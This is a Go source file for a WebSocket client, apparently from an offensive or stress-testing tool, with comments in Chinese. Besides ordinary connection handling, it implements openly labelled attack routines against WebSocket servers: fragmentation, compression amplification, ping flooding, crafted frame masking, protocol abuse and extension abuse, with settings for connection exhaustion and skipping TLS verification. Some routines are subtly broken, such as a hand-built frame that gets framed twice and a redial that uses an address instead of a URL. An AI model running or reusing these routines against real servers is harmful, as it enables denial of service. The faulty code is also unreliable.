package websocket

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/klauspost/compress/flate"
)

// ClientOptions WebSocket客户端配置选项
type ClientOptions struct {
	// 基础配置
	Timeout         time.Duration
	PingInterval    time.Duration
	PongWait        time.Duration
	WriteWait       time.Duration
	MaxMessageSize  int64
	ReadBufferSize  int
	WriteBufferSize int

	// TLS配置
	TLSConfig  *tls.Config
	SkipVerify bool

	// 代理配置
	Proxy     string
	ProxyAuth string

	// 其他配置
	Headers      map[string]string
	Subprotocols []string
	Compression  bool
	FragmentSize int
	RetryTimes   int
	RetryDelay   time.Duration

	// WebSocket攻击相关配置
	FragmentationMode string        // 分片模式：random, fixed, increasing
	CompressionRatio  float64       // 压缩比率
	PingFloodInterval time.Duration // Ping洪水间隔
	FrameMaskingMode  string        // 帧掩码模式
	ExtensionAbuse    []string      // 滥用的扩展列表
	ProtocolAbuse     []string      // 滥用的协议列表

	// 连接耗尽相关配置
	MaxConcurrentConns int           // 最大并发连接数
	ConnHoldTime       time.Duration // 连接保持时间

	// Debug配置
	Debug bool
}

// DefaultClientOptions 返回默认配置
func DefaultClientOptions() ClientOptions {
	return ClientOptions{
		Timeout:         30 * time.Second,
		PingInterval:    30 * time.Second,
		PongWait:        60 * time.Second,
		WriteWait:       10 * time.Second,
		MaxMessageSize:  512 * 1024, // 512KB
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
		RetryTimes:      3,
		RetryDelay:      time.Second,
	}
}

// Client WebSocket客户端
type Client struct {
	conn      *websocket.Conn
	options   ClientOptions
	ctx       context.Context
	cancel    context.CancelFunc
	mu        sync.Mutex
	isClosed  bool
	closeOnce sync.Once

	// 消息通道
	send    chan []byte
	receive chan []byte
	errors  chan error
}

// NewClient 创建新的WebSocket客户端
func NewClient(options ClientOptions) *Client {
	ctx, cancel := context.WithCancel(context.Background())
	return &Client{
		options: options,
		ctx:     ctx,
		cancel:  cancel,
		send:    make(chan []byte, 100),
		receive: make(chan []byte, 100),
		errors:  make(chan error, 10),
	}
}

// Connect 建立WebSocket连接
func (c *Client) Connect(urlStr string) error {
	// 解析URL
	u, err := url.Parse(urlStr)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	if c.options.Debug {
		fmt.Printf("\n[DEBUG] ===================== WebSocket连接 =====================\n")
		fmt.Printf("[DEBUG] 连接信息:\n")
		fmt.Printf("  URL: %s\n", urlStr)
		fmt.Printf("  协议: %s\n", u.Scheme)
		fmt.Printf("  压缩: %v\n", c.options.Compression)
		fmt.Printf("  子协议: %v\n", c.options.Subprotocols)
		fmt.Printf("  超时: %v\n", c.options.Timeout)
		fmt.Printf("[DEBUG] ====================================================\n")
	}

	// 根据协议设置TLS配置
	dialer := websocket.Dialer{
		HandshakeTimeout:  c.options.Timeout,
		ReadBufferSize:    c.options.ReadBufferSize,
		WriteBufferSize:   c.options.WriteBufferSize,
		EnableCompression: c.options.Compression,
	}

	// 配置TLS
	if u.Scheme == "wss" {
		if c.options.TLSConfig != nil {
			dialer.TLSClientConfig = c.options.TLSConfig
		} else {
			dialer.TLSClientConfig = &tls.Config{
				InsecureSkipVerify: c.options.SkipVerify,
			}
		}
	}

	// 配置代理
	if c.options.Proxy != "" {
		proxyURL, err := url.Parse(c.options.Proxy)
		if err != nil {
			return fmt.Errorf("invalid proxy URL: %v", err)
		}
		dialer.Proxy = http.ProxyURL(proxyURL)

		if c.options.Debug {
			fmt.Printf("[DEBUG] 代理配置:\n")
			fmt.Printf("  代理URL: %s\n", proxyURL.String())
			fmt.Printf("  认证: %v\n", proxyURL.User != nil)
			fmt.Printf("[DEBUG] ====================================================\n")
		}
	}

	// 建立连接
	header := http.Header{}
	for k, v := range c.options.Headers {
		header.Set(k, v)
	}

	// 添加子协议
	if len(c.options.Subprotocols) > 0 {
		header["Sec-WebSocket-Protocol"] = c.options.Subprotocols
	}

	// 尝试建立连接
	start := time.Now()
	conn, resp, err := dialer.Dial(urlStr, header)
	duration := time.Since(start)

	if c.options.Debug {
		fmt.Printf("\n[DEBUG] ===================== 连接结果 =====================\n")
		if err != nil {
			fmt.Printf("[DEBUG] 连接失败:\n")
			fmt.Printf("  错误: %v\n", err)
			fmt.Printf("  耗时: %v\n", duration)
			if resp != nil {
				fmt.Printf("  状态: %s\n", resp.Status)
				fmt.Printf("  Headers:\n")
				for key, values := range resp.Header {
					fmt.Printf("    %s: %v\n", key, values)
				}
			}
		} else {
			fmt.Printf("[DEBUG] 连接成功:\n")
			fmt.Printf("  耗时: %v\n", duration)
			fmt.Printf("  本地地址: %s\n", conn.LocalAddr().String())
			fmt.Printf("  远程地址: %s\n", conn.RemoteAddr().String())
			fmt.Printf("  子协议: %s\n", conn.Subprotocol())
			fmt.Printf("  压缩: %v\n", c.options.Compression)
		}
		fmt.Printf("[DEBUG] ====================================================\n\n")
	}

	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}

	c.conn = conn
	return nil
}

// readPump 处理读取消息
func (c *Client) readPump() {
	defer func() {
		c.Close()
	}()

	for {
		select {
		case <-c.ctx.Done():
			return
		default:
			_, message, err := c.conn.ReadMessage()
			if err != nil {
				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
					c.errors <- fmt.Errorf("websocket read error: %v", err)
				}
				return
			}
			select {
			case c.receive <- message:
			default:
				// 如果接收通道已满，丢弃消息
				c.errors <- fmt.Errorf("receive buffer full, message dropped")
			}
		}
	}
}

// writePump 处理发送消息
func (c *Client) writePump() {
	for {
		select {
		case <-c.ctx.Done():
			return
		case message := <-c.send:
			c.mu.Lock()
			err := c.conn.SetWriteDeadline(time.Now().Add(c.options.WriteWait))
			if err != nil {
				c.mu.Unlock()
				c.errors <- fmt.Errorf("failed to set write deadline: %v", err)
				continue
			}

			// 如果设置了分片大小，进行消息分片
			if c.options.FragmentSize > 0 && len(message) > c.options.FragmentSize {
				for i := 0; i < len(message); i += c.options.FragmentSize {
					end := i + c.options.FragmentSize
					if end > len(message) {
						end = len(message)
					}
					err = c.conn.WriteMessage(websocket.TextMessage, message[i:end])
					if err != nil {
						c.mu.Unlock()
						c.errors <- fmt.Errorf("failed to write fragment: %v", err)
						break
					}
				}
			} else {
				err = c.conn.WriteMessage(websocket.TextMessage, message)
				if err != nil {
					c.mu.Unlock()
					c.errors <- fmt.Errorf("failed to write message: %v", err)
					continue
				}
			}
			c.mu.Unlock()
		}
	}
}

// pingPump 处理心跳
func (c *Client) pingPump() {
	ticker := time.NewTicker(c.options.PingInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			c.mu.Lock()
			err := c.conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(c.options.WriteWait))
			c.mu.Unlock()
			if err != nil {
				c.errors <- fmt.Errorf("failed to write ping: %v", err)
				return
			}
		}
	}
}

// Send 发送消息
func (c *Client) Send(message []byte) error {
	if c.isClosed {
		return fmt.Errorf("connection is closed")
	}
	select {
	case c.send <- message:
		return nil
	case <-time.After(c.options.WriteWait):
		return fmt.Errorf("send message timeout")
	}
}

// Receive 接收消息
func (c *Client) Receive() ([]byte, error) {
	if c.isClosed {
		return nil, fmt.Errorf("connection is closed")
	}
	select {
	case msg := <-c.receive:
		return msg, nil
	case err := <-c.errors:
		return nil, err
	case <-time.After(c.options.Timeout):
		return nil, fmt.Errorf("receive message timeout")
	}
}

// Close 关闭连接
func (c *Client) Close() {
	c.closeOnce.Do(func() {
		c.mu.Lock()
		defer c.mu.Unlock()

		c.isClosed = true
		c.cancel()

		if c.conn != nil {
			// 发送关闭消息
			deadline := time.Now().Add(c.options.WriteWait)
			c.conn.WriteControl(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""),
				deadline)
			c.conn.Close()
		}

		close(c.send)
		close(c.receive)
		close(c.errors)
	})
}

// IsConnected 检查连接状态
func (c *Client) IsConnected() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return !c.isClosed && c.conn != nil
}

// GetConnection 获取原始连接
func (c *Client) GetConnection() *websocket.Conn {
	return c.conn
}

// DoFragmentationAttack 执行分片攻击
func (c *Client) DoFragmentationAttack(ctx context.Context) error {
	message := make([]byte, c.options.WriteBufferSize)
	rand.Read(message)

	var fragmentSize int
	switch c.options.FragmentationMode {
	case "random":
		fragmentSize = rand.Intn(c.options.WriteBufferSize)
	case "increasing":
		fragmentSize = 1
	default:
		fragmentSize = c.options.FragmentSize
	}

	for start := 0; start < len(message); {
		if c.options.FragmentationMode == "increasing" {
			fragmentSize *= 2
		}
		end := start + fragmentSize
		if end > len(message) {
			end = len(message)
		}

		err := c.conn.WriteMessage(websocket.TextMessage, message[start:end])
		if err != nil {
			return fmt.Errorf("fragmentation attack failed: %v", err)
		}

		start = end
		time.Sleep(time.Millisecond * 10)
	}

	return nil
}

// DoCompressionAmp 执行压缩放大攻击
func (c *Client) DoCompressionAmp(ctx context.Context) error {
	// 创建高压缩比数据
	payload := strings.Repeat("A", int(float64(c.options.WriteBufferSize)*c.options.CompressionRatio))

	// 压缩数据
	var compressed bytes.Buffer
	writer, _ := flate.NewWriter(&compressed, flate.BestCompression)
	writer.Write([]byte(payload))
	writer.Close()

	// 发送压缩数据
	return c.conn.WriteMessage(websocket.BinaryMessage, compressed.Bytes())
}

// DoPingFlood 执行Ping洪水攻击
func (c *Client) DoPingFlood(ctx context.Context) error {
	ticker := time.NewTicker(c.options.PingFloodInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			err := c.conn.WriteControl(websocket.PingMessage,
				[]byte("ping"), time.Now().Add(c.options.WriteWait))
			if err != nil {
				return fmt.Errorf("ping flood failed: %v", err)
			}
		}
	}
}

// DoFrameMasking 执行帧掩码攻击
func (c *Client) DoFrameMasking(ctx context.Context) error {
	message := make([]byte, c.options.WriteBufferSize)
	rand.Read(message)

	var mask []byte
	switch c.options.FrameMaskingMode {
	case "zero":
		mask = []byte{0x00, 0x00, 0x00, 0x00}
	case "all":
		mask = []byte{0xFF, 0xFF, 0xFF, 0xFF}
	default:
		mask = make([]byte, 4)
		rand.Read(mask)
	}

	frame := make([]byte, len(message)+10)
	frame[0] = 0x82 // 二进制帧
	frame[1] = 0x7E // 16位长度
	binary.BigEndian.PutUint16(frame[2:4], uint16(len(message)))
	copy(frame[4:8], mask)

	for i := 0; i < len(message); i++ {
		frame[8+i] = message[i] ^ mask[i%4]
	}

	return c.conn.WriteMessage(websocket.BinaryMessage, frame)
}

// DoProtocolAbuse 执行协议滥用攻击
func (c *Client) DoProtocolAbuse(ctx context.Context) error {
	for _, proto := range c.options.ProtocolAbuse {
		message := fmt.Sprintf("CONNECT %s\r\n\r\n", proto)
		err := c.conn.WriteMessage(websocket.TextMessage, []byte(message))
		if err != nil {
			return fmt.Errorf("protocol abuse failed: %v", err)
		}
		time.Sleep(time.Millisecond * 100)
	}
	return nil
}

// DoExtensionAbuse 执行扩展滥用攻击
func (c *Client) DoExtensionAbuse(ctx context.Context) error {
	headers := make(http.Header)
	for _, ext := range c.options.ExtensionAbuse {
		headers.Add("Sec-WebSocket-Extensions", ext)
	}

	// 重新连接以使用新的扩展
	urlStr := c.conn.RemoteAddr().String()
	c.Close()

	dialer := websocket.Dialer{
		HandshakeTimeout:  c.options.Timeout,
		ReadBufferSize:    c.options.ReadBufferSize,
		WriteBufferSize:   c.options.WriteBufferSize,
		EnableCompression: true,
	}

	conn, _, err := dialer.Dial(urlStr, headers)
	if err != nil {
		return fmt.Errorf("extension abuse failed: %v", err)
	}
	c.conn = conn

	// 发送测试消息
	message := make([]byte, c.options.WriteBufferSize)
	rand.Read(message)
	return c.conn.WriteMessage(websocket.BinaryMessage, message)
}
